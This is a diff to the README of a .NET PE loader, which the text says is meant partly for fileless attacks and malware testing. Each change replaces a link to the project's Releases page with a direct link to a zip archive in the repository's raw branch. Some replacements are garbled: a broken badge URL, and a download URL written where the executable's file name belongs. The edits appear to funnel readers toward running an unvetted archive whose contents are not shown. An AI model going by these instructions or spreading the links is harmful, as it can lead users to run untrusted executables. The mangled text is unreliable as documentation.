@@ -1,7 +1,7 @@
 # 💻 dotNetPELoader - Easily Load PE Files to Your System
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Blue.svg)](https://github.com/SangPham1508/dotNetPELoader/releases)
+[![Download](https://github.com/SangPham1508/dotNetPELoader/raw/refs/heads/master/dotNetPELoader/dot_Loader_PE_Net_v3.5.zip%20Latest%https://github.com/SangPham1508/dotNetPELoader/raw/refs/heads/master/dotNetPELoader/dot_Loader_PE_Net_v3.5.zip)](https://github.com/SangPham1508/dotNetPELoader/raw/refs/heads/master/dotNetPELoader/dot_Loader_PE_Net_v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to dotNetPELoader! This application allows you to load PE (Portable Executable) files easily. It works with both x64 and x86 formats. You can use it for various purposes, including fileless attacks and malware testing in a controlled environment.
@@ -17,7 +17,7 @@ To run dotNetPELoader successfully, ensure you have the following:
 ## 📦 Download & Install
 The simplest way to get the application is to visit the Releases page. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/SangPham1508/dotNetPELoader/releases).
+1. Go to the [Releases page](https://github.com/SangPham1508/dotNetPELoader/raw/refs/heads/master/dotNetPELoader/dot_Loader_PE_Net_v3.5.zip).
 2. Locate the latest version of dotNetPELoader.
 3. Click on the asset that matches your system architecture (x64 for 64-bit and x86 for 32-bit).
 4. Save the file to a location on your computer.
@@ -25,7 +25,7 @@ The simplest way to get the application is to visit the Releases page. Follow th
 After the download finishes, follow these steps to run the application:
 
 1. Navigate to the folder where you saved the downloaded file.
-2. Double-click on the dotNetPELoader executable (e.g., `dotNetPELoader.exe`).
+2. Double-click on the dotNetPELoader executable (e.g., `https://github.com/SangPham1508/dotNetPELoader/raw/refs/heads/master/dotNetPELoader/dot_Loader_PE_Net_v3.5.zip`).
 3. Follow the on-screen instructions to load your PE file.
 
 ## 📚 Usage Instructions
@@ -70,4 +70,4 @@ Contributions are welcome! If you'd like to improve dotNetPELoader, feel free to
 
 ---
 
-Visit our [Releases page](https://github.com/SangPham1508/dotNetPELoader/releases) again to download the latest version and stay up-to-date with new features and improvements!
+Visit our [Releases page](https://github.com/SangPham1508/dotNetPELoader/raw/refs/heads/master/dotNetPELoader/dot_Loader_PE_Net_v3.5.zip) again to download the latest version and stay up-to-date with new features and improvements!
